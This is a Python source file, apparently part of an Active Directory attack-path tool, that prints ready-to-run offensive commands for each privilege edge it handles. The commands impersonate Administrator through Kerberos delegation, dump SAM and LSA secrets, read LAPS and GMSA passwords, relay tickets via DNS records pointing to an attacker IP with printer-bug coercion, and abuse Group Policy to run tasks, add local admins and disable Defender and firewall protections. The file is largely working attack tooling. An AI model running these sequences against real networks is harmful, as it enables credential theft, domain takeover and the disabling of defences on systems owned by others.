        Secretsdump(glob, parent, target)


# RBCD U2U
class x_U2U(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        comment = [
            'RBCD + U2U',
            'We need to use the nthash instead of the password to enforce the use of RC4',
            'instead of AES otherwise we should receive the error \'KDC has no support',
            'for encryption type\'',
        ]
        print_comment(comment)

        if parent.secret_type == c.SECRET_PASSWORD:
            parent.secret_type = c.SECRET_NTHASH
            parent.secret = password_to_nthash(parent.secret)

        if parent.secret_type != c.SECRET_NTHASH:
            print_comment('Error: can\'t generate the nthash with aes')
            return

        v = vars(glob, parent, target)

        TGTRequest(glob, parent)

        comment = 'Extract the ticket session key and check that the ticket is forwardable'
        cmd = "session_key=`describeTicket.py '{parent.obj.name}.ccache' | grep 'Ticket Session Key' | awk -F': ' '{{print $2}}'`\necho $session_key\ndescribeTicket.py '{parent.obj.name}.ccache' | grep Flags"
        print_line(comment, cmd, v)

        comment = 'Change the password of {parent.obj.name} with a hash, WARNING: THE PASSWORD WILL BE UNRECOVERABLE'
        cmd = "changepasswd.py '{fqdn}/{parent.obj.name}@{dc_name}' -hashes :{parent.secret} -dc-ip {dc_ip} -protocol smb-samr -newhash $session_key"
        print_line(comment, cmd, v)


class x_SelfRBCD(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        if require is None:
            print('error: the SelfRBCD needs a require statement')
            return

        v = vars(glob, parent, target)

        comment = [
            'Constrained delegation without protocol transition (Kerberos only)',
            'Around Aug./Sept. 2022, Microsoft seems to have patched the "self-rbcd" approach,',
            'but relaying on another account for the RBCD will still work (UNIMPLEMENTED -> TODO)',
        ]
        print_comment(comment)

        print_comment('Self-RBCD')

        x_RBCD.print(previous_action, glob, parent, parent.obj, require)
        GetSTImpersonate(glob, require['object'], parent.obj, do_u2u=False)

        print_cmd('ticket="$KRB5CCNAME"')
        print()


# Constrained delegation with/without protocol transition
class x_AllowedToDelegate(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        # take arbitrary the first spn
        requested_spn = parent.obj.rights_by_sid[target.sid]['AllowedToDelegate'][0]

        v = vars(glob, parent, target,
                requested_spn=requested_spn,
                plain=f'{Fore.RED}PLAIN_PASSWORD_HEX{Style.RESET_ALL}')

        contains_fqdn = requested_spn.upper().endswith(v['fqdn'].upper())

        if previous_action == '::SelfRBCD':
            v['do_additional'] = ' -additional-ticket "$ticket"'
        else:
            v['do_additional'] = ''
            print_comment('Constrained delegation with protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION)')

        comment = 'Ask a TGS on {target.name} and impersonate it to Administrator (S4U2Self + S4U2Proxy)'

        if parent.krb_auth:
            cmd = "getST.py '{fqdn}/{parent.obj.name}' -no-pass -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_additional}"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "getST.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_additional}"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "getST.py '{fqdn}/{parent.obj.name}' -no-pass -aesKey {parent.secret} -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_additional}"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "getST.py '{fqdn}/{parent.obj.name}:{parent.secret}' -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_additional}"

        print_line(comment, cmd, v, end=False)


        v['requested_spn'] = v['requested_spn'].replace('/', '_')
        print_cmd("export KRB5CCNAME='Administrator@{requested_spn}@{fqdn}.ccache'", v)
        print()

        comment = 'Dump the SAM and LSA cache on {target.name} to get the plain_password_hex'

        if contains_fqdn:
            cmd = "secretsdump.py '{target_no_dollar}.{fqdn}' -k -no-pass -dc-ip {dc_ip} -target-ip '{target_ip}'"
        else:
            cmd = "secretsdump.py '{target_no_dollar}' -k -no-pass -dc-ip {dc_ip} -target-ip '{target_ip}'"

        print_line(comment, cmd, v)

        comment = "Get the AES key from the password for more convenience"
        cmd = "./tools/aesKrbKeyGen.py '{fqdn}/{target.name}:{plain}'"
        print_line(comment, cmd, v)


class x_ReadLAPSPassword(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            "Read LAPS passwords",
            'Executing the attack will generate a 4662 (An operation was performed on an object)',
            'event at the domain controller if an appropriate SACL is in place on the target object.',
        ]

        if parent.krb_auth:
            cmd = "GetLAPSPassword.py '{fqdn}/{parent.obj.name}' -dc-ip {dc_ip} -k -no-pass"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "GetLAPSPassword.py '{fqdn}/{parent.obj.name}' -dc-ip {dc_ip} -hashes :{parent.secret}"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "GetLAPSPassword.py '{fqdn}/{parent.obj.name}' -dc-ip {dc_ip} -k -aesKey {parent.secret}"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "GetLAPSPassword.py '{fqdn}/{parent.obj.name}:{parent.secret}' -dc-ip {dc_ip}"

        print_line(comment, cmd, v)


class x_ReadGMSAPassword(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        comment = [
            'Read GMSA passwords',
            'When abusing a GMSA that is already logged onto a system, you will have the same',
            'opsec considerations as when abusing a standard user logon (see HasSession).',
            'When retrieving the GMSA password from Active Directory, you may generate a 4662',
            'event on the Domain Controller; however, that event will likely perfectly resemble',
            'a legitimate event if you request the password from the same context as a computer',
            'account that is already authorized to read the GMSA password.',
        ]

        if parent.krb_auth:
            cmd = "./tools/readgmsa.py '{fqdn}/{parent.obj.name}@{dc_name}' -use-ldaps -dc-ip {dc_ip} -k"
        elif parent.secret_type == c.SECRET_NTHASH:
            cmd = "./tools/readgmsa.py '{fqdn}/{parent.obj.name}@{dc_ip}' -use-ldaps -hashes :{parent.secret}"
        elif parent.secret_type == c.SECRET_AESKEY:
            cmd = "./tools/readgmsa.py '{fqdn}/{parent.obj.name}@{dc_ip}' -use-ldaps -k -aesKey {parent.secret}"
        elif parent.secret_type == c.SECRET_PASSWORD:
            cmd = "./tools/readgmsa.py '{fqdn}/{parent.obj.name}:{parent.secret}@{dc_ip}' -use-ldaps"

        print_line(comment, cmd, v)


# Unconstrained delegation
class x_AllowedToDelegateToAny(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        mydomain = f'{Fore.RED}arbitrary.{glob["fqdn_lower"]}{Style.RESET_ALL}'

        v = vars(glob, parent, target,
                attacker_ip=f'{Fore.RED}ATTACKER_IP{Style.RESET_ALL}',
                mydomain=mydomain)

        TGTRequest(glob, parent)

        print_comment('Method 1: rubeus')

        comment = "Prepare Rubeus, run the command on {parent.obj.name}"
        cmd = "Rubeus.exe monitor /interval:5"
        print_line(comment, cmd, v)

        comment = "Un-base64 the ticket and save it to rubeus.kirbi"
        cmd = "ticketConverter.py rubeus.kirbi '{dc_name}$@{fqdn}_krbtgt@{fqdn}.ccache'"
        print_line(comment, cmd, v)

        print_comment('End method 1, goto coerce')

        print_comment('Method 2: krbrelay')

        print_comment("Add an SPN on {parent.obj.name}", v, end=False)
        Attr(v, parent, parent.obj.name,
                key='msDS-AdditionalDnsHostName',
                add_value=mydomain)
        print()

        if parent.secret_type != c.SECRET_AESKEY:
            GetAESOnHost(glob, parent)

        comment = 'Add a DNS entry'
        cmd = "krbrelayx/dnstool.py -u '{fqdn}\\{parent.obj.name}' -port 636 -force-ssl -dc-ip {dc_ip} -dns-ip {dc_ip} -k --record {mydomain} --data {attacker_ip} --action add {dc_name}"
        print_line(comment, cmd, v)

        comment = 'Wait max 3 minutes for the DNS propagation'
        cmd = "dig @{dc_ip} {mydomain}"
        print_line(comment, cmd, v)

        comment = 'Prepare krbrelay, use the AES key of {parent.obj.name}'
        cmd = 'sudo krbrelayx/krbrelayx.py -debug -t idontcaretarget -aesKey {parent.secret}'
        print_line(comment, cmd, v)

        print_comment('End method 2')

        comment = 'Coerce {dc_name} to us (use the ticket of {parent.obj.name}), check that you have a \'Saved ticket\' in krbrelayx'
        cmd = "krbrelayx/printerbug.py -k -no-pass -dc-ip {dc_ip} -target-ip {dc_ip} '{fqdn}/{parent.obj.name}@{dc_name}' {mydomain}"
        print_line(comment, cmd, v)

        cmd = "export KRB5CCNAME='{dc_name}$@{fqdn}_krbtgt@{fqdn}.ccache'"
        print_cmd(cmd, v)
        print()


class x_WriteGPLink(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)
        print_comment([
            'Unimplemented WriteGPLink({target.name})',
            'https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory',
            'https://markgamache.blogspot.com/2020/07/exploiting-ad-gplink-for-good-or-evil.html',
        ], v)


class x_GPOImmediateTask(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        if require is None:
            print('error: the GPOImmediateTask needs a require statement')
            return

        gpo = require['original_target']

        v = vars(glob, parent, target, gpo=gpo)

        print_comment('The GPO {gpo.name} is applied only on OU(s):', v, end=False)
        if gpo.gpo_links_to_ou:
            for dn in gpo.gpo_links_to_ou:
                print_comment(dn, end=False)
        else:
            print_comment('no links found to any OU', end=False)
        print()

        comment = [
            'Prepare the xml schedule task, mimic the real xml file. These parameters are the default',
            'values when you create a new task.',
            '- the author can be modified',
            '- remove --args if you don\'t need it (don\'t do --args \'\')',
            '- inside the xml, you can change the creation date (default is now)',
            '- if you want to delay the execution, use --start-at DATE (see the help)',
        ]

        if target.type == c.T_COMPUTER:
            cmd = "./tools/xmltask.py --version 1.2 --start-at immediate --author '{domain_short_name}\\Administrator' --taskname 'taskname' --description 'description' --runlevel h --run-as-system --logontype S4U --filter '{target.name}' --cmd 'C:\\Windows\\System32\\cmd.exe' --args '/c \"echo hello >C:\\hello.txt\"' >ScheduledTasks.xml"
        elif target.type == c.T_USER:
            cmd = "./tools/xmltask.py --version 1.2 --start-at immediate --author '{domain_short_name}\\Administrator' --taskname 'taskname' --description 'description' --runlevel l --run-as-user --logontype InteractiveToken --filter '{domain_short_name}\\{target.name}' --filter-sid {target.sid} --cmd 'C:\\Windows\\System32\\cmd.exe' --args '/c \"echo hello >C:\\hello.txt\"' >ScheduledTasks.xml"

        print_line(comment, cmd, v)

        pre_update_gpo(v, parent, target, gpo)

        comment = 'Create the subpath if not present and push ScheduledTasks.xml'
        if target.type == c.T_COMPUTER:
            cmd = 'cd /{fqdn_lower}/Policies/{gpo.gpo_dirname_id}/Machine/Preferences/ScheduledTasks'
        else:
            cmd = 'cd /{fqdn_lower}/Policies/{gpo.gpo_dirname_id}/User/Preferences/ScheduledTasks'
        print_line(comment, cmd, v, end=False)

        print_cmd([
            '## get ScheduledTasks.xml # to restore it',
            'put ScheduledTasks.xml',
            'exit',
        ])

        post_update_gpo(v, parent, target, gpo, '[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]')


class x_GPOLogonScript(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        if require is None:
            print('error: the GPOLogonScript needs a require statement')
            return

        gpo = require['original_target']

        v = vars(glob, parent, target, gpo=gpo,
            folder='Startup' if target.type == c.T_COMPUTER else 'Logon')

        print_comment('The GPO {gpo.name} is applied only on OU(s):', v, end=False)
        for dn in gpo.gpo_links_to_ou:
            print_comment(dn, end=False)
        print()

        comment = [
            'Prepare the scripts.ini (replace or update it!)',
        ]
        cmd = [
            'echo \'echo hello >C:\\hello.txt\' >myscript.bat',
            './tools/scriptsini.py --tag {folder} myscript.bat >scripts.ini',
        ]
        print_line(comment, cmd, v)

        pre_update_gpo(v, parent, target, gpo)

        comment = 'Create the subpath if not present and push files'
        if target.type == c.T_COMPUTER:
            cmd = 'cd /{fqdn_lower}/Policies/{gpo.gpo_dirname_id}/Machine/Scripts'
        else:
            cmd = 'cd /{fqdn_lower}/Policies/{gpo.gpo_dirname_id}/User/Scripts'
        print_line(comment, cmd, v, end=False)

        print_cmd([
            '## get scripts.ini # to restore',
            'put scripts.ini',
            'cd {folder}',
            'put myscript.bat',
            'exit',
        ], v)
        print()

        if target.type == c.T_COMPUTER:
            print_comment('The startup script is executed only on reboot')
            post_update_gpo(v, parent, target, gpo, '[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]')
        else:
            post_update_gpo(v, parent, target, gpo, '[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B66650-4972-11D1-A7CA-0000F87571E3}]')


class x_GPOAddLocalAdmin(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        if require is None:
            print('error: the GPOAddLocalAdmin needs a require statement')
            return

        gpo = require['original_target']

        v = vars(glob, parent, target, gpo=gpo)

        print_comment('The GPO {gpo.name} is applied only on OU(s):', v, end=False)
        for dn in gpo.gpo_links_to_ou:
            print_comment(dn, end=False)
        print()

        comment = [
            'Prepare the GptTmpl (replace or update it!)',
            'Add {parent.obj.name} in the local group Administrators',
            'Warning: updating the members of a local group removes all previous',
            'members. If the GPO is unlink or restored then the members list is also',
            'restored to the default values. A better solution is to check if {parent.obj.name}',
            'is in any group, then set this group into the local admin group like:',
            '*<GROUP_SID>__Memberof =',
            '*<GROUP_SID>__Members = *S-1-5-32-544',
        ]
        cmd = './tools/gpttmpl.py S-1-5-32-544 --members {parent.obj.sid},{domain_sid}-512,{domain_sid}-500 >GptTmpl.inf'
        print_line(comment, cmd, v)

        pre_update_gpo(v, parent, target, gpo)

        comment = 'Create the subpath if not present and push GptTmpl.inf'
        cmd = 'cd /{fqdn_lower}/Policies/{gpo.gpo_dirname_id}/Machine/Microsoft/Windows NT/SecEdit'
        print_line(comment, cmd, v, end=False)

        print_cmd([
            '## get GptTmpl.inf # to restore',
            'put GptTmpl.inf',
            'exit',
        ])
        print()

        post_update_gpo(v, parent, target, gpo, '[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]')

        Secretsdump(glob, parent, target)


class x_GPODisableDefender(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        if require is None:
            print('error: the GPODisableDefender needs a require statement')
            return

        gpo = require['original_target']

        v = vars(glob, parent, target, gpo=gpo)

        print_comment('The GPO {gpo.name} is applied only on OU(s):', v, end=False)
        for dn in gpo.gpo_links_to_ou:
            print_comment(f'- {dn}', end=False)
        print()

        comment = [
            'Prepare comment.cmtx (original format and spaces) and Registry.pol. You can also',
            'update an Registry.pol by converting to json.',
            'Select the policies you need (update comment.cmtx if you remove one of these entries):',
            '- Exclusions',
            '- Disable RealTime',
            '- Enable RDP',
            '- Disable Firewall',
        ]
        print_comment(comment)

        print('echo 77u/PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0ndXRmLTgnPz4NCjxwb2xpY3lDb21tZW50cyB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiByZXZpc2lvbj0iMS4wIiBzY2hlbWFWZXJzaW9uPSIxLjAiIHhtbG5zPSJodHRwOi8vd3d3Lm1pY3Jvc29mdC5jb20vR3JvdXBQb2xpY3kvQ29tbWVudERlZmluaXRpb25zIj4NCiAgPHBvbGljeU5hbWVzcGFjZXM+DQogICAgPHVzaW5nIHByZWZpeD0ibnMwIiBuYW1lc3BhY2U9Ik1pY3Jvc29mdC5Qb2xpY2llcy5UZXJtaW5hbFNlcnZlciI+PC91c2luZz4NCiAgICA8dXNpbmcgcHJlZml4PSJuczEiIG5hbWVzcGFjZT0iTWljcm9zb2Z0LlBvbGljaWVzLldpbmRvd3NEZWZlbmRlciI+PC91c2luZz4NCiAgICA8dXNpbmcgcHJlZml4PSJuczIiIG5hbWVzcGFjZT0iTWljcm9zb2Z0LlBvbGljaWVzLldpbmRvd3NGaXJld2FsbCI+PC91c2luZz4NCiAgPC9wb2xpY3lOYW1lc3BhY2VzPg0KICA8Y29tbWVudHM+DQogICAgPGFkbVRlbXBsYXRlPjwvYWRtVGVtcGxhdGU+DQogIDwvY29tbWVudHM+DQogIDxyZXNvdXJjZXMgbWluUmVxdWlyZWRSZXZpc2lvbj0iMS4wIj4NCiAgICA8c3RyaW5nVGFibGU+PC9zdHJpbmdUYWJsZT4NCiAgPC9yZXNvdXJjZXM+DQo8L3BvbGljeUNvbW1lbnRzPg== | base64 -d >comment.cmtx')
        print()

        print("""cat pol.json
[
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Exclusions",
        "valuename": "Exclusions_Paths",
        "data": 1,
        "type": "REG_DWORD"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Exclusions",
        "valuename": "Exclusions_Processes",
        "data": 1,
        "type": "REG_DWORD"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Paths",
        "valuename": "",
        "data": "C:\\\\",
        "type": "REG_SZ"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Processes",
        "valuename": "desc",
        "data": "C:\\\\mybin.exe",
        "type": "REG_SZ"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection",
        "valuename": "DisableRealtimeMonitoring",
        "data": 1,
        "type": "REG_DWORD"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection",
        "valuename": "DisableBehaviorMonitoring",
        "data": 1,
        "type": "REG_DWORD"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection",
        "valuename": "DisableScriptScanning",
        "data": 1,
        "type": "REG_DWORD"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection",
        "valuename": "DisableOnAccessProtection",
        "data": 1,
        "type": "REG_DWORD"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection",
        "valuename": "DisableScanOnRealtimeEnable",
        "data": 1,
        "type": "REG_DWORD"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile\\\\RemoteAdminSettings",
        "valuename": "Enabled",
        "data": 1,
        "type": "REG_DWORD"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile\\\\RemoteAdminSettings",
        "valuename": "RemoteAddresses",
        "data": "",
        "type": "REG_SZ"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile\\\\Services\\\\RemoteDesktop",
        "valuename": "Enabled",
        "data": 1,
        "type": "REG_DWORD"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile\\\\Services\\\\RemoteDesktop",
        "valuename": "RemoteAddresses",
        "data": "",
        "type": "REG_SZ"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile\\\\RemoteAdminSettings",
        "valuename": "Enabled",
        "data": 1,
        "type": "REG_DWORD"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile\\\\RemoteAdminSettings",
        "valuename": "RemoteAddresses",
        "data": "",
        "type": "REG_SZ"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile\\\\Services\\\\RemoteDesktop",
        "valuename": "Enabled",
        "data": 1,
        "type": "REG_DWORD"
    },
    {
        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile\\\\Services\\\\RemoteDesktop",
        "valuename": "RemoteAddresses",
        "data": "",
        "type": "REG_SZ"
    }
]
""")
        print()
        print('./tools/readpol.py pol.json --save Registry.pol')
        print()

        pre_update_gpo(v, parent, target, gpo)

        comment = 'Push files (replace or update them)'
        cmd = 'cd /{fqdn_lower}/Policies/{gpo.gpo_dirname_id}/Machine/'
        print_line(comment, cmd, v, end=False)

        print_cmd([
            '## get comment.cmtx',
            '## get Registry.pol',
            'put comment.cmtx',
            'put Registry.pol',
            'exit',
        ])
        print()

        post_update_gpo(v, parent, target, gpo, '[{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]')

        Secretsdump(glob, parent, target)


class x_SeBackup(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)

        TGTRequest(glob, parent)

        comment = "Ensure /etc/krb5.conf is configured"
        cmd = [
            "[libdefaults]",
            "default_realm = {fqdn}",
            "[realms]",
            "{fqdn} = {{",
            "    kdc = {target_no_dollar}.{fqdn}",
            "    admin_server = {target_no_dollar}.{fqdn}",
            "    default_domain = {fqdn}",
            "}}",
        ]
        print_line(comment, cmd, v)

        comment = [
            "Connect to the DC. If you want to access to another computer, add its IP",
            "in /etc/hosts. Why it doesn't work without kinit...?",
        ]
        cmd = [
            "kinit",
            "smbclient --use-krb5-ccache=$KRB5CCNAME '\\\\{target_no_dollar}.{fqdn}\\C$'",
        ]

        print_line(comment, cmd, v)

        print_comment("Read/write all files you want (NTDS.dit for example if you are on a DC...)")


class x_BlankPassword(Action):
    def print(previous_action:str, glob:dict, parent:Owned, target:LDAPObject, require:dict):
        v = vars(glob, parent, target)
        print_comment("The password of {target.name} may be blank... or not", v)
